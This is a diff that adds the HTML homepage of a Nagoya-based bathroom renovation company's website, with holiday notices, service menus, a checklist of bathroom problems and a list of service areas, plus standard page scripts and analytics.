@@ -1,0 +1,1091 @@
+
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ja" xml:lang="ja">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="Generator" content="GP4.23.1" />
+<meta name="Robots" content="INDEX,FOLLOW" />
+<meta http-equiv="Content-Script-Type" content="text/javascript" />
+<meta http-equiv="Content-Style-Type" content="text/css" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Cache-Control" content="no-cache" />
+<meta http-equiv="Expires" content="Thu, 01 Dec 1994 16:00:00 GMT" />
+
+<link rel="stylesheet" type="text/css" href="http://www.unitbath-reform.com/styles-site.css" />
+
+<title>ユニットバスリフォーム.COM｜マンションリフォーム専門店</title>
+<link rel="stylesheet" type="text/css" href="http://www.unitbath-reform.com/layouts-site.css" />
+<meta name="description" content="INAXサンウェーブポイントゲット全国コンテスト 『システムバスリフォーム売上』 3年連続中部地区1位。マンションの浴室・風呂・浴槽の専門店。愛知県名古屋市のグッドライフが運営するマンションリフォーム専門サイトです。風呂・浴槽・浴室のことならマンションリフォーム専門店へ！！" />
+
+<meta name="keywords" content="名古屋,横浜,愛知,ユニットバスリフォーム,神奈川,東京,お風呂,三重,岐阜,マンション,価格,グッドライフ" />
+
+<link rel="alternate" type="application/atom+xml" title="Atom" href="atom.xml" />
+<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="rss.xml" />
+<link rel="alternate" type="application/rss+xml" title="ROR" href="sitemap.xml" />
+
+<link rel="stylesheet"  href="http://www.unitbath-reform.com/css/lightbox.css" type="text/css" media="screen" />
+
+<script type="text/javascript">
+/*@cc_on 
+var doc = document;
+eval('var document = doc');
+@*/
+</script>
+
+<script type="text/javascript" src="http://www.unitbath-reform.com//js/fontstyle.js"></script>
+<script type="text/javascript" src="http://www.unitbath-reform.com/js/sidehide.js"></script>
+<script type="text/javascript" src="http://www.unitbath-reform.com/js/prototype.js"></script>
+<script type="text/javascript" src="http://www.unitbath-reform.com/js/effects.js"></script>
+<script type="text/javascript" src="http://www.unitbath-reform.com/js/auto-scroll.js"></script>
+<script type="text/javascript" src="http://www.unitbath-reform.com/js/moo.fx.js"></script>
+<script type="text/javascript" src="http://www.unitbath-reform.com/js/litebox-1.0.js"></script>
+<script type="text/javascript" src="http://www.unitbath-reform.com/js/imagelib.js"></script>
+
+<script type="text/javascript">
+	<!--
+		function imageChange1(img) {
+			window.document.getElementById("imageSpace1").src = img;
+		}
+		function imageChange2(img) {
+			window.document.getElementById("imageSpace2").src = img;
+		}
+		function imageChange3(img) {
+			window.document.getElementById("imageSpace3").src = img;
+		}
+		function imageChange4(img) {
+			window.document.getElementById("imageSpace4").src = img;
+		}
+	//-->
+</script>
+
+</head>
+
+
+
+
+
+<body onload="initLightbox()" class="bodyLeft">
+
+<!--1-->
+<!-- START wrapper -->
+<div id="wrapper" >
+
+<!-- START header -->
+<div id="header" class="clearfix header">
+
+<!-- START headerInner -->
+<div id="headerInner">
+<!-- START headerLeft -->
+<div id="headerLeft" class="clearfix">
+<h1>愛知県名古屋市のグッドライフが運営するマンション用ユニットバスリフォームの専門サイト</h1>
+<h2><a href="http://www.unitbath-reform.com/" class="logo"><img src="http://www.unitbath-reform.com/common/logo.gif" alt="マンションの浴室・浴槽リフォームの専門店、愛知県名古屋市のグッドライフ" /></a></h2>
+<h3>当社はINAXサンウェーブポイントゲット全国コンテスト 『システムバスリフォーム売上』 3年連続中部地区1位です。</h3>
+</div>
+<!-- END headerLeft -->
+
+<!-- START headerRight -->
+<div id="headerRight" class="headerRight">
+<ul id="naviButton" class="clearfix">
+  <li id="inquiry"><a href="http://www.unitbath-reform.com/inquiry/" class="naviButton"><span>お問い合わせ</span></a></li>
+  <li id="outline"><a href="http://www.unitbath-reform.com/sitemap.html" class="naviButton"><span>サイトマップ</span></a></li>
+</ul>
+<div id="telNumberWrap" class="clearfix">
+<div id="telNumber"><img src="http://www.unitbath-reform.com/images/tel_number.gif" alt="お電話でのお問い合わせはこちら：0120-079-026" /></div></div>
+      <form name="google_search" id="google_search" method="get" action="http://www.google.co.jp/search">
+	  <input type="hidden" name="ie" value="UTF-8" />
+	  <input type="hidden" name="oe" value="UTF-8" />
+	  <input type="hidden" name="hl" value="ja" />
+	  <input type="hidden" name="domains" value="www.unitbath-reform.com" />
+	  <input type="hidden" name="sitesearch" value="www.unitbath-reform.com" />
+        <ul id="searchBox" class="clearfix">
+          <li id="searchInput">
+			<input id="search" type="text" name="q" size="15" maxlength="280" value="サイト内検索" onblur="if(this.value == '') this.value='サイト内検索';" onfocus="if(this.value == 'サイト内検索') this.value='';" />
+          </li>
+          <li id="search-button">
+            <input type="image" src="http://www.unitbath-reform.com/images/spacer.gif" name="btnG" alt="検索" title="検索" onclick="javascript:window.document.google_search.submit();" onkeypress="" />
+          </li>
+          <li id="rss">
+          <a href="http://www.unitbath-reform.com/atom.xml" title="RSSを希望の方はこちら">RSS配信</a>
+		  </li>
+        </ul>
+      </form>
+</div>
+<!-- END headerRight -->
+
+</div>
+<!-- END headerInner -->
+
+</div>
+<!-- END header -->
+
+
+ 
+
+
+
+<!-- START mainImage -->
+<div id="mainImage">
+
+
+<img src="http://www.unitbath-reform.com/common/topimg120906.jpg" alt="ユニットバスリフォーム.COM｜マンションリフォーム専門店" />
+</div>
+<!-- END mainImage -->
+
+
+
+
+
+<div id="content" class="clearfix content">
+
+
+<!-- START main -->
+
+	<div id="main" class="mainLeft">
+
+
+<!-- START mainInner -->
+<div id="mainInner">
+
+
+
+
+
+
+
+
+
+
+<!-- START contentsBox -->
+<div class="contentsBox" id="news">
+<div class="contentsBoxBody clearfix">
+<div class="contentsBoxTitle clearfix">
+<h4>最新情報</h4>
+
+<p><a href="http://www.unitbath-reform.com/news.html">一覧を見る</a></p>
+
+</div>
+<dl class="clearfix">
+
+
+
+
+<dt>2018/12/22</dt>
+<dd>年末年始のお知らせ。いつもご利用いただき誠にありがとうございます。年末年始の営業につきまして12月27日（水）から1月4日（金）までを休暇とさせていただき、1月5日（土）からの通常営業となります。皆様にはご迷惑・ご不便をお掛けすることと存じますが、ご了承いただきたくお願い申し上げます。</dd>
+
+<dt>2018/08/03</dt>
+<dd>夏季休暇のお知らせ。誠に勝手ながら夏季休暇を8月8日(水)～8月15日(水)とさせていただきます。  皆様には大変ご迷惑をおかけしますが、何卒ご了承いただけますよう、よろしくお願いします。</dd>
+
+<dt>2018/05/28</dt>
+<dd>中期休暇のお知らせ。誠に勝手ながら弊社では,さらなるお客様へのサービス向上の一環と いたしまして、研修のため下記の期間を休暇とさせていただきます。休暇期間は６月４日（月）から6月８日（金）までの5日間になります。</dd>
+
+<dt>2017/12/01</dt>
+<dd>年末年始のお知らせ。いつもご利用いただき誠にありがとうございます。年末年始の営業につきまして12月27日（水）から1月3日（水）までを休暇とさせていただき、1月4日（木）からの通常営業となります。皆様にはご迷惑・ご不便をお掛けすることと存じますが、ご了承いただきたくお願い申し上げます。</dd>
+
+<dt>2017/08/01</dt>
+<dd>夏季休暇のお知らせ。当社では誠に勝手ながら夏季休暇を8月9日(水)～16日(水)とさせていただきます。</dd>
+
+</dl>
+</div>
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+ 
+
+
+
+<!-- ▼▼▼　ここからレイアウトキャッチャー　▼▼▼-->
+
+
+
+<!-- START contentsBox -->
+<div class="contentsBox clearfix" id="aboutSite">
+<div class="contentsBoxBody clearfix">
+<div class="contentsBoxTitle"><h4>浴室・浴槽のお悩みはお任せ下さい！</h4></div>
+
+<div id="aboutSiteBody">
+<a href="http://www.unitbath-reform.com/menu10/"><img width="536" height="190" alt="" src="http://www.unitbath-reform.com/sitetop/images/main_b01ー0227.png" /></a><br />
+<img width="536" height="733" alt="" src="http://www.unitbath-reform.com/sitetop/images/main_b02.jpg" /><a href="http://www.unitbath-reform.com/menu08/"><img width="536" height="129" src="http://www.unitbath-reform.com/sitetop/images/main_b03.jpg" alt="" style="margin-bottom: 20px;" /></a>  <a href="http://www.unitbath-reform.com/menu03/"><img width="536" height="267" src="http://www.unitbath-reform.com/sitetop/images/%E6%96%BD%E5%B7%A5%E4%BE%8B%E2%91%A3.png" alt="" /></a><br />
+</div>
+
+</div>
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+<!-- START contentsBox -->
+<div class="contentsBox" id="contents">
+<div class="contentsBoxBody clearfix">
+
+
+		  
+			<!-- START box01Wrap -->
+			<div class="box01Wrap clearfix">
+			
+			<div class="box01WrapInner">
+			
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			
+			</div>
+			
+			
+			</div>
+			<!-- END box01Wrap -->
+			
+			
+			
+</div>
+
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+
+
+<!-- START contentsBox -->
+<div class="contentsBox clearfix" id="aboutSite">
+<div class="contentsBoxBody clearfix">
+<div class="contentsBoxTitle"><h4>メニュー</h4></div>
+
+</div>
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+<!-- START contentsBox -->
+<div class="contentsBox" id="contents">
+<div class="contentsBoxBody clearfix">
+
+
+		  
+			<!-- START box01Wrap -->
+			<div class="box01Wrap clearfix">
+			
+			<div class="box01WrapInner">
+			
+			  
+			  <div class="box01 clearfix">
+			    <h5>マンション用ﾕﾆｯﾄﾊﾞｽ入門</h5>
+			    
+			      <div class="box01PhotoWrap">
+			      <div class="box01Photo"><img border="0" src="http://www.unitbath-reform.com/sitetop/images/top_b01.jpg" alt="マンション用ﾕﾆｯﾄﾊﾞｽ入門" width="140" /></div>
+			      </div>
+			    
+			    <div class="box01Right">
+			      
+			      <p>ユニットバスリフォームを検討中の方に見て欲しい入門ページです。</p>
+			      
+			    <div class="btDetail"><a href="http://www.unitbath-reform.com/menu01/">詳細01</a></div>
+			    </div>			
+			  </div>
+			  
+			  
+			  
+			  <div class="box01 clearfix">
+			    <h5>お風呂のリフォームとは？</h5>
+			    
+			      <div class="box01PhotoWrap">
+			      <div class="box01Photo"><img border="0" src="http://www.unitbath-reform.com/sitetop/images/top_b02.jpg" alt="お風呂のリフォームとは？" width="140" /></div>
+			      </div>
+				
+			    <div class="box01Right">
+			      
+				  <p>お風呂・浴槽のリフォームには、どんな種類があるんでしょう。</p>
+				  
+			    <div class="btDetail"><a href="http://www.unitbath-reform.com/menu02/">詳細02</a></div>
+			  </div>			
+			  </div>
+			  
+			  
+			  
+			  <div class="box01 clearfix">
+			    <h5>ﾏﾝｼｮﾝ用ﾕﾆｯﾄﾊﾞｽ施工例</h5>
+			    
+			      <div class="box01PhotoWrap">
+			      <div class="box01Photo"><img border="0" src="http://www.unitbath-reform.com/sitetop/images/top_b03.jpg" alt="ﾏﾝｼｮﾝ用ﾕﾆｯﾄﾊﾞｽ施工例" width="140" /></div>
+			      </div>
+				
+			    <div class="box01Right">
+			      
+				  <p>グッドライフのユニットバス施工例です。主に愛知県・名古屋市・岐阜県・三重県。</p>
+				  
+			    <div class="btDetail"><a href="http://www.unitbath-reform.com/menu03/">詳細03</a></div>
+			  </div>			
+			  </div>
+			  
+			  
+			  
+			  <div class="box01 clearfix">
+			    <h5>一押しマンションリフォーム</h5>
+			    
+			      <div class="box01PhotoWrap">
+			      <div class="box01Photo"><img border="0" src="http://www.unitbath-reform.com/sitetop/images/top_b04.jpg" alt="一押しマンションリフォーム" width="140" /></div>
+			      </div>
+				
+			    <div class="box01Right">
+			      
+				  <p>当サイトがおすすめする一押しユニットバスです！</p>
+				  
+			    <div class="btDetail"><a href="http://www.unitbath-reform.com/menu04/">詳細04</a></div>
+			  </div>			
+			  </div>
+			  
+			  
+			  
+			  <div class="box01 clearfix">
+			    <h5>お客様の声</h5>
+			    
+			      <div class="box01PhotoWrap">
+			      <div class="box01Photo"><img border="0" src="http://www.unitbath-reform.com/sitetop/images/top_b05.jpg" alt="お客様の声" width="140" /></div>
+			      </div>
+				
+			    <div class="box01Right">
+			      
+				  <p>お風呂・浴槽のリフォームをさせて頂いたお客様の声です。</p>
+				  
+			    <div class="btDetail"><a href="http://www.unitbath-reform.com/menu06/">詳細05</a></div>
+			  </div>			
+			  </div>
+			  
+			  
+			  
+			  <div class="box01 clearfix">
+			    <h5>マンションリフォームQ&A</h5>
+			    
+			      <div class="box01PhotoWrap">
+			      <div class="box01Photo"><img border="0" src="http://www.unitbath-reform.com/sitetop/images/top_b06.jpg" alt="マンションリフォームQ&A" width="140" /></div>
+			      </div>
+				
+			    <div class="box01Right">
+			      
+				  <p>お風呂・浴槽のリフォームに関してのQ&Aページです。</p>
+				  
+			    <div class="btDetail"><a href="http://www.unitbath-reform.com/menu07/">詳細06</a></div>
+			  </div>			
+			  </div>
+			  
+			
+			</div>
+			
+			
+			</div>
+			<!-- END box01Wrap -->
+			
+			
+			
+</div>
+
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+
+
+<!-- START contentsBox -->
+<div class="contentsBox clearfix" id="aboutSite">
+<div class="contentsBoxBody clearfix">
+<div class="contentsBoxTitle"><h4>お風呂のこと、ちゃんと考えていますか？</h4></div>
+
+<div id="aboutSiteBody">
+<img width="536" height="44" alt="" src="http://www.unitbath-reform.com/sitetop/images/%E3%82%B8%E3%82%A7%E3%83%8E%E3%83%90%E7%94%BB%E5%83%8F1.png" /><br />
+<ul class="ml45">
+    <li class="topcheck"><input type="checkbox" value="on" />築年数が10年以上である。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />世帯数が4人以上である。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />お風呂でリラックスしたい。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />お風呂を広くしたい。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />お風呂の掃除が大変と思った事がある。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />お風呂場の匂いが気になる。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />お風呂場のカビがひどい。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />排水口の手入れが大変。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />壁のタイルにヒビがある</li>
+    <li class="topcheck"><input type="checkbox" value="on" />バスタブの細かい傷が気になる。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />入り口の段差や浴槽のまたぎの高さなどが気になる。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />浴槽のお湯が冷めやすい。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />追い焚き機能をつけたい。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />お風呂全体が寒い。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />水廻りの工事が高いと思っている。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />水のトラブルが気になる。</li>
+    <li class="topcheck"><input type="checkbox" value="on" />他社で見積もりをとった事がある。</li>
+</ul>
+<br />
+<a href="http://www.unitbath-reform.com/inquiry/"><img alt="" align="right" width="204" height="55" src="http://www.unitbath-reform.com/sitetop/images/proni.jpg" /></a>5つ以上チェックがあった方は今すぐお問い合わせ下さい。<br />
+そんなお悩みを解決いたします！！
+<div style="clear: both"><img alt="" width="1" height="1" src="http://www.unitbath-reform.com/images/spacer.gif" /></div>
+</div>
+
+</div>
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+<!-- START contentsBox -->
+<div class="contentsBox" id="contents">
+<div class="contentsBoxBody clearfix">
+
+
+		  
+			<!-- START box01Wrap -->
+			<div class="box01Wrap clearfix">
+			
+			<div class="box01WrapInner">
+			
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			
+			</div>
+			
+			
+			</div>
+			<!-- END box01Wrap -->
+			
+			
+			
+</div>
+
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+
+
+<!-- START contentsBox -->
+<div class="contentsBox clearfix" id="aboutSite">
+<div class="contentsBoxBody clearfix">
+<div class="contentsBoxTitle"><h4>施工エリア一覧</h4></div>
+
+<div id="aboutSiteBody">
+<div class="text-box-main" style="margin-top: 20px">
+<p><span style="font-size: 16px;"><span style="color: rgb(0, 0, 255);"><strong>施工エリア一覧<br />
+<br type="_moz" />
+</strong></span></span></p>
+<div><span style="font-size: 12px;"><strong>【関東エリア】<br />
+</strong></span><span style="font-size: 14px;"><b><br />
+</b><span style="font-size: 12px;"><strong>神奈川県</strong></span></span><b><br />
+</b>横浜市・川崎市・大和市・厚木市・海老名市・綾瀬市・座間市・相模原市・横須賀市・<br />
+三浦市・逗子市・鎌倉市・藤沢市・芽ヶ﨑市・平塚市・伊勢原市・葉山町・寒川町・愛川町・清川町<b><br />
+<br />
+</b><span style="font-size: 12px;"><strong>【東海エリア】<br />
+</strong></span><b><br />
+</b><span style="font-size: 12px;"><strong>愛知県</strong></span><b><br />
+</b>名古屋市・尾張旭市・長久手市・北名古屋市・日進市・瀬戸市・みよし市・<br />
+春日井市・小牧市・一宮市・岩倉市・犬山市・稲沢市・江南市・<br />
+清須市・あま市・津島市・愛西市・弥富市・<br />
+扶桑町・大口町・蟹江町・大治町・飛鳥村・豊山町・東郷町・<br />
+豊明市・大府市・東海市・知多市・知立市・刈谷市・常滑市・<br />
+半田市・高浜市・碧南市・安城市・西尾市・東浦町・阿久比町・武豊町・美浜町・南知多町・幸田町・<br />
+豊田市・岡崎市・蒲郡市・豊川市・豊橋市・新城市・田原市・設楽町・東栄町・豊根村<br />
+<b> </b><span style="font-size: 12px;"><b><br />
+</b><strong>岐阜県</strong></span><b><br />
+</b>岐阜市・各務原市・関市・羽島市・瑞穂市・大垣市・海津市・<br />
+岐南町・笠松町・北方町・大野町・神戸町・池田町・<br />
+垂井町・関ヶ原町・安八町・輪之内町・養老町・<br />
+可児市・多治見市・土岐市・瑞浪市・恵那市・美濃加茂市・富加町・坂祝町・御嵩町・川辺町<b><br />
+<br />
+</b><span style="font-size: 12px;"><strong>三重県</strong></span><b><br />
+</b>四日市市・桑名市・いなべ市・鈴鹿市・亀山市・伊賀市・津市・名張市・<br />
+木曽岬町・朝日町・川越町・東員町・菰野町<b><br type="_moz" />
+<br />
+</b></div>
+</div>
+</div>
+
+</div>
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+<!-- START contentsBox -->
+<div class="contentsBox" id="contents">
+<div class="contentsBoxBody clearfix">
+
+
+		  
+			<!-- START box01Wrap -->
+			<div class="box01Wrap clearfix">
+			
+			<div class="box01WrapInner">
+			
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			  
+			
+			</div>
+			
+			
+			</div>
+			<!-- END box01Wrap -->
+			
+			
+			
+</div>
+
+<div class="contentsBoxFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+<!-- END contentsBox -->
+
+
+<!--お問い合わせバナー-->
+
+
+	<!-- サイトトップとFMSに表示させたい場合 -->
+
+<a href="http://www.unitbath-reform.com/inquiry/"><br />
+<img src="http://www.unitbath-reform.com/sitetop/images/otoiawase.jpg" alt="フォームでのお問い合わせはこちら" style="margin-left: 23px; margin-bottom: 30px;" /></a>
+
+
+<!--ここまでお問い合わせバナー-->
+
+
+
+
+
+
+
+
+</div>
+<!-- END mainInner -->
+
+</div>
+<!-- END main --> 
+
+
+
+	
+		
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- leftside start -->
+
+<div id="side" class="sideLeft">
+
+
+<!-- START sideInner -->
+<div id="sideInner">
+
+<div id="navigation">
+<div id="navigationInner">
+<ul>
+
+      <li><a class="navigationBg" href="http://www.unitbath-reform.com/"><span>HOME</span></a></li>
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu10/"><span>中部地区第1位の理由</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu08/"><span>ｸﾞｯﾄﾞﾗｲﾌの一日ﾘﾌｫｰﾑ</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu01/"><span>マンション用ﾕﾆｯﾄﾊﾞｽ入門</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu02/"><span>お風呂のリフォームとは？</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu03/"><span>ﾏﾝｼｮﾝ用ﾕﾆｯﾄﾊﾞｽ施工例</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu04/"><span>一押しマンションリフォーム</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu05/"><span>施工の流れ</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu07/"><span>マンションリフォームQ＆A</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu06/"><span>お客様の声</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+      	<li><a class="navigationBg" href="http://www.unitbath-reform.com/menu09/"><span>会社概要</span></a></li>
+        
+        
+      
+      
+      
+      
+             
+      
+      
+      
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<li><a href="http://www.unitbath-reform.com/extra/cat155/" title=""><span>ローンシミュレーション</span></a></li>
+	
+	
+	
+	
+        
+      
+      
+      
+      
+
+
+
+</ul>
+</div>
+<div id="navigationFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+</div>
+
+	
+	
+	
+
+	<div id="banner">
+
+ 
+	<a href="http://www.unitbath-reform.com/blog/"><img src="/images/bn_blog.jpg" alt="マンション用リフォーム専門店の社員ブログ" width="188" /></a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<img src="/common/sidebana_01.jpg" width="189" alt="加盟店" border="0" />
+<a href="http://lixil-reform.net/" target="_blank"><img src="/common/sidebana001.jpg" width="189" alt="LIXILリフォームネット" border="0" /></a>
+<a href="http://re-model.jp/" target="_blank"><img src="/common/sidebana002.jpg" width="189" alt="TOTOリモデルクラブ" border="0" /></a>
+
+
+<a href="http://www.challenge25.go.jp/index.html" target="_blank"><img src="/common/sidebana004.jpg" width="189" alt="チャレンジ25" border="0" /></a>
+
+
+
+<img src="/common/sidebana_02.jpg" width="189" alt="加盟店" border="0" />
+<a href="http://www.lixil.co.jp/" target="_blank"><img src="/common/sidebana005.jpg" width="189" alt="lixil" border="0" /></a>
+<a href="http://www.toto.co.jp/" target="_blank"><img src="/common/sidebana006.jpg" width="189" alt="TOTO" border="0" /></a>
+<a href="http://www.sunwave.co.jp/" target="_blank"><img src="/common/sidebana007.jpg" width="189" alt="SUNWAVE" border="0" /></a>
+<a href="http://panasonic.co.jp/pew/" target="_blank"><img src="/common/sidebana008.jpg" width="189" alt="Panasonic" border="0" /></a>
+<a href="http://cleanup.jp/" target="_blank"><img src="/common/sidebana009.jpg" width="189" alt="クリナップ" border="0" /></a>
+<a href="http://www.hbs.co.jp/" target="_blank"><img src="/common/sidebana010.jpg" width="189" alt="HITACHI" border="0" /></a>
+<a href="http://www.rinnai.co.jp/" target="_blank"><img src="/common/sidebana011.jpg" width="189" alt="Rinnai" border="0" /></a>
+<a href="http://www.noritz.co.jp/" target="_blank"><img src="/common/sidebana012.jpg" width="189" alt="NORITZ" border="0" /></a>
+<a href="http://www.yamaha-living.co.jp/" target="_blank"><img src="/common/sidebana013.jpg" width="189" alt="YAMAHA" border="0" /></a>
+<a href="http://www.takara-standard.co.jp/" target="_blank"><img src="/common/sidebana014.jpg" width="189" alt="タカラ" border="0" /></a>
+<a href="http://www.chofu.co.jp/" target="_blank"><img src="/common/sidebana015.jpg" width="189" alt="CHOFU" border="0" /></a>
+<a href="http://www.goodlife-eco.co.jp/" target="_blank"><img src="/common/sidebana016.jpg" width="189" alt="GENOVA" border="0" /></a>
+<a href="http://www.facebook.com/pages/%E6%A0%AA%E5%BC%8F%E4%BC%9A%E7%A4%BE%E3%82%B0%E3%83%83%E3%83%89%E3%83%A9%E3%82%A4%E3%83%95/419319948107283" target="_blank"><img src="/common/side_facebook.jpg" width="189" alt="facebook" border="0" /></a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+<!-- START contact -->
+<div id="contact">
+<div id="contactTitle"><h5>お問い合わせ</h5></div>
+<div id="contactBody" class="contactBody">
+
+<div class="tel">
+	<p><img src="http://www.unitbath-reform.com/images/inquiry_tel_number.gif" alt="お電話でのお問い合わせはこちら：0120-079-026" width="180" height="68" /></p>
+</div>
+<p class="form"><a href="http://www.unitbath-reform.com/inquiry/">フォームでのお問い合わせはこちら</a></p>
+
+</div>
+
+</div>
+<!-- END contact -->
+
+</div>
+<!-- END sideInner -->
+
+<div id="sideFooter"><img src="http://www.unitbath-reform.com/images/spacer.gif" alt="" width="1" height="1" /></div>
+
+</div>
+<!-- END #side -->
+ 
+</div>
+<!-- leftside end --> 
+
+<!-- START footer -->
+<div id="footer">
+
+<!-- START footerInner -->
+<div id="footerInner" class="clearfix">
+<div class="pagetop">
+  <p><a href="#wrapper" title="PAGE TOP">pagetop</a></p>
+</div>
+<div id="footerLeft">
+<ul>
+
+  <li><a href="http://www.unitbath-reform.com/">HOME</a> |</li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu10/">中部地区第1位の理由</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu08/">ｸﾞｯﾄﾞﾗｲﾌの一日ﾘﾌｫｰﾑ</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu01/">マンション用ﾕﾆｯﾄﾊﾞｽ入門</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu02/">お風呂のリフォームとは？</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu03/">ﾏﾝｼｮﾝ用ﾕﾆｯﾄﾊﾞｽ施工例</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu04/">一押しマンションリフォーム</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu05/">施工の流れ</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu07/">マンションリフォームQ＆A</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu06/">お客様の声</a> |</li>
+      
+    
+    
+
+     
+    
+    
+      
+        <li><a href="http://www.unitbath-reform.com/menu09/">会社概要</a> |</li>
+      
+    
+    
+
+     
+    
+    <!-- extra add -->
+    
+        
+            
+                
+                
+                
+            
+            
+                
+            
+                
+                
+                
+            
+            
+                
+                
+                
+            
+            
+                
+                
+                
+            
+            
+                
+                
+                    <li><a href="http://www.unitbath-reform.com/extra/cat155/" title=""><span>ローンシミュレーション</span></a></li>
+                
+                
+            
+            
+        
+    
+    <!-- extra add -->
+    
+  
+
+<!-- link01 -->
+
+  <li><a  href="http://www.unitbath-reform.com/inquiry/">マンション用リフォーム専門店へのお問い合わせ・ご相談はこちらから |</a></li>
+
+
+<!-- link02 -->
+
+  <li><a  href="http://www.unitbath-reform.com/blog/">グッドライフのスタッフブログ |</a></li>
+
+
+<!-- link03 -->
+
+  <li><a target="_blank" href="http://www.goodlife-eco.co.jp/">運営会社グッドライフ |</a></li>
+
+
+</ul>
+<address>Copyright (c) Unitbath-reform.com All Rights Reserved</address>
+</div>
+</div>
+<!-- END footerInner -->
+
+</div>
+<!-- END footer -->
+
+</div>
+<!-- END wrapper -->
+
+<!-- google -->
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-9344232-31");
+
+pageTracker._trackPageview();
+
+</script>
+<!-- google -->
+
